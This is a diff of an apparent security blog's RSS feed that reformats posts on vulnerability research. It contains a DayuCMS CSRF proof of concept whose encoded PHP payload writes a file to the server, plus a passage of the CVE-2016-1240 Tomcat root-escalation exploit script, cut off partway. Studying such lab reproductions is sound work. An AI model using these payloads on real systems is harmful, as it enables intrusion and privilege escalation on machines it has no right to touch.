-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;do_submit&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;importdata&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;bGFycnk=-MTtmcHV0cyhmb3BlbihiYXNlNjRfZGVjb2RlKCdiR0Z5Y25rdWNHaHcnKSwndycpLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnY0dod2FXNW1ieWdwT3lBL1BnJykp&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;导入规则&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+    &amp;lt;form action=&amp;quot;http://192.168.1.103/dayucms/dayucms.php?mod=gather&amp;amp;file=gather&amp;amp;action=import&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;do_submit&amp;quot; value=&amp;quot;1&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;importdata&amp;quot; value=&amp;quot;bGFycnk=-MTtmcHV0cyhmb3BlbihiYXNlNjRfZGVjb2RlKCdiR0Z5Y25rdWNHaHcnKSwndycpLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnY0dod2FXNW1ieWdwT3lBL1BnJykp&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;1&amp;quot; value=&amp;quot;导入规则&amp;quot;&amp;gt;
+    &amp;lt;/form&amp;gt;
 
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+    &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
+        document.forms[0].submit();
+    &amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 </description>
         
-        <pubDate>Wed, 01 Mar 2017 00:00:00 -0500</pubDate>
+        <pubDate>Wed, 01 Mar 2017 00:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/dayucms-csrf-getshell.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/dayucms-csrf-getshell.html</guid>
@@ -431,7 +584,7 @@
 
 </description>
         
-        <pubDate>Thu, 16 Feb 2017 00:00:00 -0500</pubDate>
+        <pubDate>Thu, 16 Feb 2017 00:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/php-cgi-vuln-practice.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/php-cgi-vuln-practice.html</guid>
@@ -486,7 +639,7 @@
 
 </description>
         
-        <pubDate>Wed, 11 Jan 2017 00:00:00 -0500</pubDate>
+        <pubDate>Wed, 11 Jan 2017 00:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/nmaprecordsearch-and-mssql-sqli-labs.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/nmaprecordsearch-and-mssql-sqli-labs.html</guid>
@@ -531,7 +684,7 @@
 
 </description>
         
-        <pubDate>Wed, 28 Dec 2016 00:00:00 -0500</pubDate>
+        <pubDate>Wed, 28 Dec 2016 00:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/eyewitness-tool-note.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/eyewitness-tool-note.html</guid>
@@ -574,7 +727,7 @@
 
 </description>
         
-        <pubDate>Wed, 14 Dec 2016 00:00:00 -0500</pubDate>
+        <pubDate>Wed, 14 Dec 2016 00:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/windows-2008-gpp.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/windows-2008-gpp.html</guid>
@@ -625,7 +778,7 @@
 
 </description>
         
-        <pubDate>Tue, 01 Nov 2016 00:00:00 -0400</pubDate>
+        <pubDate>Tue, 01 Nov 2016 00:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/cwcms-code-audit.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/cwcms-code-audit.html</guid>
@@ -644,10 +797,12 @@
 
 &lt;p&gt;以tomcat7为例，在init脚本&lt;code&gt;/etc/init.d/tomcat7&lt;/code&gt;中&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Run the catalina.sh script as a daemon&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; +e
-touch &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CATALINA_PID&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CATALINA_BASE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;/logs/catalina.out
-chown &lt;span class=&quot;nv&quot;&gt;$TOMCAT7_USER&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CATALINA_PID&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CATALINA_BASE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;/logs/catalina.out&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;# Run the catalina.sh script as a daemon
+set +e
+touch &amp;quot;$CATALINA_PID&amp;quot; &amp;quot;$CATALINA_BASE&amp;quot;/logs/catalina.out
+chown $TOMCAT7_USER &amp;quot;$CATALINA_PID&amp;quot; &amp;quot;$CATALINA_BASE&amp;quot;/logs/catalina.out&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;这段脚本主要是root用户在touch了catalina.out文件后，再将文件的所有者改为tomcat7的用户。脚本看似没有什么问题，但是cve的作者提出这么一个场景：当攻击者以tomcat的身份访问服务器的时候（比如说拿下了tomcat服务器的webshell），他就可以将catalina.out替换成指向任意文件的动态链接（软链接），在服务器重启之后（当然，是需要创造这种机会的），init脚本再次以root权限运行，将动态链接所指向的文件的所有者改成了tomcat用户，这样攻击者就可以读写服务器上的任意文件了。正如长亭科技的&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&amp;amp;mid=2247483675&amp;amp;idx=1&amp;amp;sn=4b3333c9a16e2e29c6fed72ad45e0787&amp;amp;mpshare=1&amp;amp;scene=1&amp;amp;srcid=1008Gu6ULmhFZ9bHfhaeHCKr#rd&quot;&gt;文章&lt;/a&gt;所分析的，作者并不甘于单纯的文件操作，而是利用SUID和/etc/ld.so.preload的方法获取到root权限的shell&lt;/p&gt;
 
@@ -655,15 +810,17 @@ chown &lt;span class=&quot;nv&quot;&gt;$TOMCAT7_USER&lt;/span&gt; &lt;span class
 
 &lt;p&gt;老生常谈的系统更新就不赘述了，我这里使用Ununtu14.04虚拟机和tomcat7进行测试。问题出现于package中的初始化脚本中，而脚本则是来源于安装时的deb包，虽然可以通过apt-get直接安装tomcat7，但是debian官方及时进行了修复，我们得去下载历史的deb包来安装服务复现环境。在&lt;a href=&quot;http://snapshot.debian.org/&quot;&gt;snapshot&lt;/a&gt;上可以找到历史的deb包，这里我选择安装tomcat 7.0.14-1，过程如下&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/libservlet3.0-java-doc_7.0.14-1_all.deb
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo dpkg -i libservlet3.0-java-doc_7.0.14-1_all.deb
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo apt-get install libecj-java
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/libtomcat7-java_7.0.14-1_all.deb
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo dpkg -i libtomcat7-java_7.0.14-1_all.deb
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/tomcat7-common_7.0.14-1_all.deb
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo dpkg -i tomcat7-common_7.0.14-1_all.deb
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/tomcat7_7.0.14-1_all.deb
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo dpkg -i tomcat7_7.0.14-1_all.deb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/libservlet3.0-java-doc_7.0.14-1_all.deb
+$ sudo dpkg -i libservlet3.0-java-doc_7.0.14-1_all.deb
+$ sudo apt-get install libecj-java
+$ wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/libtomcat7-java_7.0.14-1_all.deb
+$ sudo dpkg -i libtomcat7-java_7.0.14-1_all.deb
+$ wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/tomcat7-common_7.0.14-1_all.deb
+$ sudo dpkg -i tomcat7-common_7.0.14-1_all.deb
+$ wget http://snapshot.debian.org/archive/debian/20110521T031913Z/pool/main/t/tomcat7/tomcat7_7.0.14-1_all.deb
+$ sudo dpkg -i tomcat7_7.0.14-1_all.deb&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;都是一些常规的依赖安装，安装好后&lt;code&gt;cat -n /etc/init.d/tomcat7 | less&lt;/code&gt;就可看到存在缺陷的脚本片段了，但是在尝试启动tomcat的时候会报错&lt;code&gt;* no JDK found - please set JAVA_HOME&lt;/code&gt;，起来也要安装jdk环境&lt;code&gt;sudo apt-get install --no-install-recommends openjdk-7-jdk&lt;/code&gt;，再根据&lt;a href=&quot;http://askubuntu.com/questions/154953/specify-jdk-for-tomcat7&quot;&gt;这里&lt;/a&gt;在&lt;code&gt;/etc/default/tomcat7&lt;/code&gt;中加入&lt;code&gt;JAVA_HOME&lt;/code&gt;的环境变量&lt;code&gt;JAVA_HOME=/usr/lib/jvm/java-7-openjdk-amd64&lt;/code&gt;，最后再重启一下tomcat就成功搭建起来了&lt;/p&gt;
 
@@ -675,209 +832,211 @@ chown &lt;span class=&quot;nv&quot;&gt;$TOMCAT7_USER&lt;/span&gt; &lt;span class
 
 &lt;p&gt;为了方便说明，请允许我先把脚本贴过来&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# CVE-2016-1240&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Discovered and coded by:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Dawid Golunski&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# http://legalhackers.com&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# This exploit targets Tomcat (versions 6, 7 and 8) packaging on &lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Debian-based distros including Debian, Ubuntu etc.&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# It allows attackers with a tomcat shell (e.g. obtained remotely through a &lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# vulnerable java webapp, or locally via weak permissions on webapps in the &lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Tomcat webroot directories etc.) to escalate their privileges to root.&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Usage:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# ./tomcat-rootprivesc-deb.sh path_to_catalina.out [-deferred]&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# The exploit can used in two ways:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# -active (assumed by default) - which waits for a Tomcat restart in a loop and instantly&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# gains/executes a rootshell via ld.so.preload as soon as Tomcat service is restarted. &lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# It also gives attacker a chance to execute: kill [tomcat-pid] command to force/speed up&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# a Tomcat restart (done manually by an admin, or potentially by some tomcat service watchdog etc.)&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# -deferred (requires the -deferred switch on argv[2]) - this mode symlinks the logfile to &lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# /etc/default/locale and exits. It removes the need for the exploit to run in a loop waiting. &lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Attackers can come back at a later time and check on the /etc/default/locale file. Upon a &lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Tomcat restart / server reboot, the file should be owned by tomcat user. The attackers can&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# then add arbitrary commands to the file which will be executed with root privileges by &lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# the /etc/cron.daily/tomcatN logrotation cronjob (run daily around 6:25am on default &lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Ubuntu/Debian Tomcat installations).&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# See full advisory for details at:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Disclaimer:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# For testing purposes only. Do no harm.&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;#!/bin/bash
+#
+# Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit
+#
+# CVE-2016-1240
+#
+# Discovered and coded by:
+#
+# Dawid Golunski
+# http://legalhackers.com
+#
+# This exploit targets Tomcat (versions 6, 7 and 8) packaging on 
+# Debian-based distros including Debian, Ubuntu etc.
+# It allows attackers with a tomcat shell (e.g. obtained remotely through a 
+# vulnerable java webapp, or locally via weak permissions on webapps in the 
+# Tomcat webroot directories etc.) to escalate their privileges to root.
+#
+# Usage:
+# ./tomcat-rootprivesc-deb.sh path_to_catalina.out [-deferred]
+#
+# The exploit can used in two ways:
+#
+# -active (assumed by default) - which waits for a Tomcat restart in a loop and instantly
+# gains/executes a rootshell via ld.so.preload as soon as Tomcat service is restarted. 
+# It also gives attacker a chance to execute: kill [tomcat-pid] command to force/speed up
+# a Tomcat restart (done manually by an admin, or potentially by some tomcat service watchdog etc.)
+#
+# -deferred (requires the -deferred switch on argv[2]) - this mode symlinks the logfile to 
+# /etc/default/locale and exits. It removes the need for the exploit to run in a loop waiting. 
+# Attackers can come back at a later time and check on the /etc/default/locale file. Upon a 
+# Tomcat restart / server reboot, the file should be owned by tomcat user. The attackers can
+# then add arbitrary commands to the file which will be executed with root privileges by 
+# the /etc/cron.daily/tomcatN logrotation cronjob (run daily around 6:25am on default 
+# Ubuntu/Debian Tomcat installations).
+#
+# See full advisory for details at:
+# http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html
+#
+# Disclaimer:
+# For testing purposes only. Do no harm.
+#
  
-&lt;span class=&quot;nv&quot;&gt;BACKDOORSH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;BACKDOORPATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/tmp/tomcatrootsh&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;PRIVESCLIB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/tmp/privesclib.so&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;PRIVESCSRC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/tmp/privesclib.c&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;SUIDBIN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/usr/bin/sudo&amp;quot;&lt;/span&gt;
+BACKDOORSH=&amp;quot;/bin/bash&amp;quot;
+BACKDOORPATH=&amp;quot;/tmp/tomcatrootsh&amp;quot;
+PRIVESCLIB=&amp;quot;/tmp/privesclib.so&amp;quot;
+PRIVESCSRC=&amp;quot;/tmp/privesclib.c&amp;quot;
+SUIDBIN=&amp;quot;/usr/bin/sudo&amp;quot;
  
-&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; cleanexit &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;# Cleanup &lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Cleaning up...&amp;quot;&lt;/span&gt;
-    rm -f &lt;span class=&quot;nv&quot;&gt;$PRIVESCSRC&lt;/span&gt;
-    rm -f &lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt;
-    rm -f &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;
-    touch &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -f /etc/ld.so.preload &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -n &amp;gt; /etc/ld.so.preload 2&amp;gt;/dev/null
-    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Job done. Exiting with code &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; \n&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+function cleanexit {
+    # Cleanup 
+    echo -e &amp;quot;\n[+] Cleaning up...&amp;quot;
+    rm -f $PRIVESCSRC
+    rm -f $PRIVESCLIB
+    rm -f $TOMCATLOG
+    touch $TOMCATLOG
+    if [ -f /etc/ld.so.preload ]; then
+        echo -n &amp;gt; /etc/ld.so.preload 2&amp;gt;/dev/null
+    fi
+    echo -e &amp;quot;\n[+] Job done. Exiting with code $1 \n&amp;quot;
+    exit $1
+}
  
-&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ctrl_c&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.&amp;quot;&lt;/span&gt;
+function ctrl_c() {
+        echo -e &amp;quot;\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.&amp;quot;
     cleanexit 0
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+}
  
-&lt;span class=&quot;c&quot;&gt;#intro &lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\033[94m \nTomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit\nCVE-2016-1240\n&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m&amp;quot;&lt;/span&gt;
+#intro 
+echo -e &amp;quot;\033[94m \nTomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit\nCVE-2016-1240\n&amp;quot;
+echo -e &amp;quot;Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m&amp;quot;
  
-&lt;span class=&quot;c&quot;&gt;# Args&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;-lt &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] Exploit usage: \n\n&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; path_to_catalina.out [-deferred]\n&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;3
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;-deferred&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;deferred&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;active&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+# Args
+if [ $# -lt 1 ]; then
+    echo -e &amp;quot;\n[!] Exploit usage: \n\n$0 path_to_catalina.out [-deferred]\n&amp;quot;
+    exit 3
+fi
+if [ &amp;quot;$2&amp;quot; = &amp;quot;-deferred&amp;quot; ]; then
+    mode=&amp;quot;deferred&amp;quot;
+else
+    mode=&amp;quot;active&amp;quot;
+fi
  
-&lt;span class=&quot;c&quot;&gt;# Priv check&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Starting the exploit in [\033[94m&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mode&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;\033[0m] mode with the following privileges: \n`id`&amp;quot;&lt;/span&gt;
-id &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep -q tomcat
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -ne &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] You need to execute the exploit as tomcat user! Exiting.\n&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;3
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+# Priv check
